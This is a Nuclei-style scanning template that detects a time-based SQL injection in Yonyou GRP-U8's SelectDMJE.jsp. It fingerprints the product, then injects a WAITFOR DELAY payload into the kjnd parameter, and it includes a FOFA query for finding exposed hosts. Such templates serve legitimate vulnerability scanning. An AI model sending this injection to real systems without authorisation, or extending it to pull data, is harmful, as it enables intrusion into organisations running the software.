id: poc-yaml-yongyou-grp-u8-selectdmje-jsp-sqli
info:
  name: 用友GRP-U8 SelectDMJE.jsp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: GRP-U8
    fofa: app="用友-GRP-U8"

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 1}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{BaseURL}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "GRP-U8"

  - raw:
      - |
        GET /u8qx/SelectDMJE.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
        Host: {{BaseURL}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: dsl
        dsl:
          - duration >= to_number(t1)
          - duration < to_number(t2)

    stop-at-first-match: true
    disable-cookie: true
    redirects: false
    unsafe: false
    cookie-reuse: false
    max-redirects: 3
    pipeline: false
    threads: 1
    pipeline-concurrent-connections: 1
    pipeline-requests-per-connection: 1
    race: false
    race_count: 1
    skip-variables-check: true

# Removed duplicated mapping keys and ensured template adheres to valid YAML Nuclei schema.
